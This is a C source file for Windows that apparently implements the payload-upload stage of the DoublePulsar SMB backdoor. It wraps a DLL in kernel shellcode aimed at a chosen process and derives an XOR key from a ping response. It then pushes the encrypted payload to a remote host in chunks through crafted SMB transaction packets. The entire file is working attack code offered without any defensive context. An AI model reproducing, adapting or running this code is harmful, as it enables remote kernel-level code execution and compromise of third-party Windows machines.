#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <stdarg.h>
#include <limits.h>
#include <math.h>
#include <io.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdint.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include <limits.h>
#include "config.h"

extern void xor_buffer(uint8_t *buffer, size_t length, uint32_t key);

static int upload_send_all(SOCKET socket_handle, const uint8_t *data, size_t length)
{
    size_t sent = 0;

    while (sent < length) {
        int result;
        size_t remaining = length - sent;
        int amount = remaining > (size_t)INT_MAX ? INT_MAX : (int)remaining;

        result = send(socket_handle, (const char *)data + sent, amount, 0);
        if (result == SOCKET_ERROR || result == 0) {
            return -1;
        }
        sent += (size_t)result;
    }

    return 0;
}

static int upload_recv_all(SOCKET socket_handle, uint8_t *data, size_t length)
{
    size_t received = 0;

    while (received < length) {
        int result;
        size_t remaining = length - received;
        int amount = remaining > (size_t)INT_MAX ? INT_MAX : (int)remaining;

        result = recv(socket_handle, (char *)data + received, amount, 0);
        if (result == SOCKET_ERROR || result == 0) {
            return -1;
        }
        received += (size_t)result;
    }

    return 0;
}

static int upload_exchange(SOCKET socket_handle, const uint8_t *request,
                           size_t request_length, uint8_t **response,
                           size_t *response_length)
{
    uint8_t header[4];
    uint32_t body_length;
    uint8_t *buffer;

    if (response == NULL || response_length == NULL ||
        request == NULL || request_length == 0) {
        return -1;
    }

    *response = NULL;
    *response_length = 0;

    if (upload_send_all(socket_handle, request, request_length) != 0 ||
        upload_recv_all(socket_handle, header, sizeof(header)) != 0) {
        return -1;
    }

    body_length = ((uint32_t)header[1] << 16) |
                  ((uint32_t)header[2] << 8) |
                  (uint32_t)header[3];
    if ((size_t)body_length > SIZE_MAX - sizeof(header)) {
        return -1;
    }

    buffer = (uint8_t *)malloc(sizeof(header) + (size_t)body_length);
    if (buffer == NULL) {
        return -1;
    }

    memcpy(buffer, header, sizeof(header));
    if (body_length != 0 &&
        upload_recv_all(socket_handle, buffer + sizeof(header),
                        (size_t)body_length) != 0) {
        free(buffer);
        return -1;
    }

    *response = buffer;
    *response_length = sizeof(header) + (size_t)body_length;
    return 0;
}

int upload_payload(const char *ip, int port, const char *payload_path, int payload_type)
{
    WSADATA wsa_data;
    SOCKET socket_handle = INVALID_SOCKET;
    struct sockaddr_in address;
    HANDLE file_handle = INVALID_HANDLE_VALUE;
    LARGE_INTEGER file_size;
    uint8_t *dll_data = NULL;
    uint8_t *payload = NULL;
    uint8_t *response = NULL;
    size_t response_length = 0;
    size_t dll_length = 0;
    size_t payload_length = 0;
    uint16_t user_id = 0;
    uint16_t tree_id = 0;
    uint32_t key = 0;
    uint32_t signature;
    uint32_t hash = 0;
    const unsigned char *process_name;
    size_t process_name_length;
    size_t i;
    int wsa_started = 0;
    int result = -1;

    (void)payload_type;

    if (ip == NULL || payload_path == NULL || port < 1 || port > 65535) {
        return -1;
    }

    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0) {
        return -1;
    }
    wsa_started = 1;

    file_handle = CreateFileA(payload_path, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file_handle == INVALID_HANDLE_VALUE ||
        !GetFileSizeEx(file_handle, &file_size) || file_size.QuadPart < 0 ||
        (uint64_t)file_size.QuadPart > UINT32_MAX ||
        (uint64_t)file_size.QuadPart > (uint64_t)(SIZE_MAX - (size_t)KERNEL_RUNDLL_SIZE)) {
        goto cleanup;
    }

    dll_length = (size_t)file_size.QuadPart;
    if (dll_length != 0) {
        dll_data = (uint8_t *)malloc(dll_length);
        if (dll_data == NULL) {
            goto cleanup;
        }

        for (i = 0; i < dll_length;) {
            DWORD bytes_read = 0;
            size_t remaining = dll_length - i;
            DWORD amount = remaining > (size_t)MAXDWORD ? MAXDWORD : (DWORD)remaining;

            if (!ReadFile(file_handle, dll_data + i, amount, &bytes_read, NULL) ||
                bytes_read == 0) {
                goto cleanup;
            }
            i += (size_t)bytes_read;
        }
    }

    CloseHandle(file_handle);
    file_handle = INVALID_HANDLE_VALUE;

    payload_length = (size_t)KERNEL_RUNDLL_SIZE + dll_length;
    if (payload_length == 0 || payload_length > UINT32_MAX ||
        dll_length > UINT32_MAX - 3978u ||
        (size_t)KERNEL_RUNDLL_TOTAL_OFFSET > (size_t)KERNEL_RUNDLL_SIZE ||
        (size_t)KERNEL_RUNDLL_SIZE - (size_t)KERNEL_RUNDLL_TOTAL_OFFSET < 4 ||
        (size_t)KERNEL_RUNDLL_DLLSIZE_OFFSET > (size_t)KERNEL_RUNDLL_SIZE ||
        (size_t)KERNEL_RUNDLL_SIZE - (size_t)KERNEL_RUNDLL_DLLSIZE_OFFSET < 4 ||
        (size_t)KERNEL_RUNDLL_ORDINAL_OFFSET > (size_t)KERNEL_RUNDLL_SIZE ||
        (size_t)KERNEL_RUNDLL_SIZE - (size_t)KERNEL_RUNDLL_ORDINAL_OFFSET < 4 ||
        (size_t)KERNEL_RUNDLL_HASH_OFFSET > (size_t)KERNEL_RUNDLL_SIZE ||
        (size_t)KERNEL_RUNDLL_SIZE - (size_t)KERNEL_RUNDLL_HASH_OFFSET < 4) {
        goto cleanup;
    }

    payload = (uint8_t *)malloc(payload_length);
    if (payload == NULL) {
        goto cleanup;
    }
    memcpy(payload, KERNEL_RUNDLL_SHELLCODE, (size_t)KERNEL_RUNDLL_SIZE);
    if (dll_length != 0) {
        memcpy(payload + (size_t)KERNEL_RUNDLL_SIZE, dll_data, dll_length);
    }

    process_name = (const unsigned char *)TARGET_INJECT_PROCESS;
    process_name_length = strlen(TARGET_INJECT_PROCESS);
    for (i = 0; i < process_name_length; ++i) {
        hash = hash * 127u + (uint32_t)process_name[i];
    }

    {
        uint32_t value = (uint32_t)(dll_length + 3978u);
        payload[KERNEL_RUNDLL_TOTAL_OFFSET] = (uint8_t)value;
        payload[KERNEL_RUNDLL_TOTAL_OFFSET + 1] = (uint8_t)(value >> 8);
        payload[KERNEL_RUNDLL_TOTAL_OFFSET + 2] = (uint8_t)(value >> 16);
        payload[KERNEL_RUNDLL_TOTAL_OFFSET + 3] = (uint8_t)(value >> 24);

        value = (uint32_t)dll_length;
        payload[KERNEL_RUNDLL_DLLSIZE_OFFSET] = (uint8_t)value;
        payload[KERNEL_RUNDLL_DLLSIZE_OFFSET + 1] = (uint8_t)(value >> 8);
        payload[KERNEL_RUNDLL_DLLSIZE_OFFSET + 2] = (uint8_t)(value >> 16);
        payload[KERNEL_RUNDLL_DLLSIZE_OFFSET + 3] = (uint8_t)(value >> 24);

        value = 1u;
        payload[KERNEL_RUNDLL_ORDINAL_OFFSET] = (uint8_t)value;
        payload[KERNEL_RUNDLL_ORDINAL_OFFSET + 1] = (uint8_t)(value >> 8);
        payload[KERNEL_RUNDLL_ORDINAL_OFFSET + 2] = (uint8_t)(value >> 16);
        payload[KERNEL_RUNDLL_ORDINAL_OFFSET + 3] = (uint8_t)(value >> 24);

        value = hash;
        payload[KERNEL_RUNDLL_HASH_OFFSET] = (uint8_t)value;
        payload[KERNEL_RUNDLL_HASH_OFFSET + 1] = (uint8_t)(value >> 8);
        payload[KERNEL_RUNDLL_HASH_OFFSET + 2] = (uint8_t)(value >> 16);
        payload[KERNEL_RUNDLL_HASH_OFFSET + 3] = (uint8_t)(value >> 24);
    }

    memset(&address, 0, sizeof(address));
    address.sin_family = AF_INET;
    address.sin_port = htons((u_short)port);
    if (InetPtonA(AF_INET, ip, &address.sin_addr) != 1) {
        goto cleanup;
    }

    socket_handle = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (socket_handle == INVALID_SOCKET ||
        connect(socket_handle, (const struct sockaddr *)&address,
                sizeof(address)) == SOCKET_ERROR) {
        goto cleanup;
    }

    {
        uint8_t request[sizeof(SMB_NEGOTIATE_PKT) - 1];
        memcpy(request, SMB_NEGOTIATE_PKT, sizeof(request));
        if (upload_exchange(socket_handle, request, sizeof(request),
                            &response, &response_length) != 0) {
            goto cleanup;
        }
        free(response);
        response = NULL;
    }

    {
        uint8_t request[sizeof(SMB_SESSION_SETUP_PKT) - 1];
        memcpy(request, SMB_SESSION_SETUP_PKT, sizeof(request));
        if (upload_exchange(socket_handle, request, sizeof(request),
                            &response, &response_length) != 0 ||
            response_length <= 33) {
            goto cleanup;
        }
        user_id = (uint16_t)response[32] | ((uint16_t)response[33] << 8);
        free(response);
        response = NULL;
    }

    {
        uint8_t request[sizeof(SMB_TREE_CONNECT_PKT) - 1];
        memcpy(request, SMB_TREE_CONNECT_PKT, sizeof(request));
        if (sizeof(request) <= 33) {
            goto cleanup;
        }
        request[32] = (uint8_t)user_id;
        request[33] = (uint8_t)(user_id >> 8);
        if (upload_exchange(socket_handle, request, sizeof(request),
                            &response, &response_length) != 0 ||
            response_length <= 29) {
            goto cleanup;
        }
        tree_id = (uint16_t)response[28] | ((uint16_t)response[29] << 8);
        free(response);
        response = NULL;
    }

    {
        uint8_t request[sizeof(DP_PING_PKT) - 1];
        memcpy(request, DP_PING_PKT, sizeof(request));
        if (sizeof(request) <= 33 ||
            (size_t)SMB_RESP_SIGNATURE_START > SIZE_MAX - 4) {
            goto cleanup;
        }
        request[28] = (uint8_t)tree_id;
        request[29] = (uint8_t)(tree_id >> 8);
        request[32] = (uint8_t)user_id;
        request[33] = (uint8_t)(user_id >> 8);
        if (upload_exchange(socket_handle, request, sizeof(request),
                            &response, &response_length) != 0 ||
            response_length < (size_t)SMB_RESP_SIGNATURE_START + 4) {
            goto cleanup;
        }

        signature = (uint32_t)response[SMB_RESP_SIGNATURE_START] |
                    ((uint32_t)response[SMB_RESP_SIGNATURE_START + 1] << 8) |
                    ((uint32_t)response[SMB_RESP_SIGNATURE_START + 2] << 16) |
                    ((uint32_t)response[SMB_RESP_SIGNATURE_START + 3] << 24);
        key = (2u * signature) ^
              ((((signature >> 16) | (signature & 0x00FF0000u)) >> 8) |
               (((signature << 16) | (signature & 0x0000FF00u)) << 8));
        free(response);
        response = NULL;
    }

    xor_buffer(payload, payload_length, key);

    for (i = 0; i < payload_length;) {
        size_t chunk_length = payload_length - i;
        size_t packet_length;
        uint8_t *request;
        uint32_t parameter;
        uint32_t netbios_length;

        if (chunk_length > (size_t)SMB_EXEC_SHELLCODE_LEN) {
            chunk_length = (size_t)SMB_EXEC_SHELLCODE_LEN;
        }
        if (chunk_length > UINT32_MAX ||
            chunk_length > SIZE_MAX - (size_t)SMB_EXEC_TEMPLATE_LEN - 12) {
            goto cleanup;
        }
        packet_length = (size_t)SMB_EXEC_TEMPLATE_LEN + 12 + chunk_length;
        request = (uint8_t *)malloc(packet_length);
        if (request == NULL) {
            goto cleanup;
        }

        memcpy(request, DP_EXEC_PKT, (size_t)SMB_EXEC_TEMPLATE_LEN);

        parameter = (uint32_t)payload_length ^ key;
        request[SMB_EXEC_TEMPLATE_LEN] = (uint8_t)parameter;
        request[SMB_EXEC_TEMPLATE_LEN + 1] = (uint8_t)(parameter >> 8);
        request[SMB_EXEC_TEMPLATE_LEN + 2] = (uint8_t)(parameter >> 16);
        request[SMB_EXEC_TEMPLATE_LEN + 3] = (uint8_t)(parameter >> 24);

        parameter = (uint32_t)chunk_length ^ key;
        request[SMB_EXEC_TEMPLATE_LEN + 4] = (uint8_t)parameter;
        request[SMB_EXEC_TEMPLATE_LEN + 5] = (uint8_t)(parameter >> 8);
        request[SMB_EXEC_TEMPLATE_LEN + 6] = (uint8_t)(parameter >> 16);
        request[SMB_EXEC_TEMPLATE_LEN + 7] = (uint8_t)(parameter >> 24);

        parameter = (uint32_t)i ^ key;
        request[SMB_EXEC_TEMPLATE_LEN + 8] = (uint8_t)parameter;
        request[SMB_EXEC_TEMPLATE_LEN + 9] = (uint8_t)(parameter >> 8);
        request[SMB_EXEC_TEMPLATE_LEN + 10] = (uint8_t)(parameter >> 16);
        request[SMB_EXEC_TEMPLATE_LEN + 11] = (uint8_t)(parameter >> 24);

        memcpy(request + SMB_EXEC_TEMPLATE_LEN + 12, payload + i,
               chunk_length);

        netbios_length = (uint32_t)(chunk_length +
                                    (size_t)SMB_EXEC_TEMPLATE_LEN + 12 - 4);
        request[SMB_NETBIOS_LEN_OFFSET] = (uint8_t)(netbios_length >> 16);
        request[SMB_NETBIOS_LEN_OFFSET + 1] = (uint8_t)(netbios_length >> 8);
        request[SMB_NETBIOS_LEN_OFFSET + 2] = (uint8_t)netbios_length;

        request[SMB_EXEC_TOTAL_DATA_OFFSET] = (uint8_t)chunk_length;
        request[SMB_EXEC_TOTAL_DATA_OFFSET + 1] = (uint8_t)(chunk_length >> 8);
        request[SMB_EXEC_DATA_COUNT_OFFSET] = (uint8_t)chunk_length;
        request[SMB_EXEC_DATA_COUNT_OFFSET + 1] = (uint8_t)(chunk_length >> 8);

        request[SMB_EXEC_BYTE_COUNT_OFFSET] = (uint8_t)(chunk_length + 12);
        request[SMB_EXEC_BYTE_COUNT_OFFSET + 1] =
            (uint8_t)((chunk_length + 12) >> 8);

        request[SMB_TID_OFFSET] = (uint8_t)tree_id;
        request[SMB_TID_OFFSET + 1] = (uint8_t)(tree_id >> 8);
        request[SMB_UID_OFFSET] = (uint8_t)user_id;
        request[SMB_UID_OFFSET + 1] = (uint8_t)(user_id >> 8);

        if (upload_exchange(socket_handle, request, packet_length,
                            &response, &response_length) != 0) {
            free(request);
            goto cleanup;
        }
        free(request);

        if (response_length <= (size_t)DP_RESP_MUX_ID_OFFSET ||
            response[DP_RESP_MUX_ID_OFFSET] != DP_MULTIPLEX_ID_EXEC) {
            goto cleanup;
        }

        free(response);
        response = NULL;
        i += chunk_length;
    }

    result = 0;

cleanup:
    if (response != NULL) {
        free(response);
    }
    if (file_handle != INVALID_HANDLE_VALUE) {
        CloseHandle(file_handle);
    }
    if (socket_handle != INVALID_SOCKET) {
        closesocket(socket_handle);
    }
    free(payload);
    free(dll_data);
    if (wsa_started) {
        WSACleanup();
    }
    return result;
}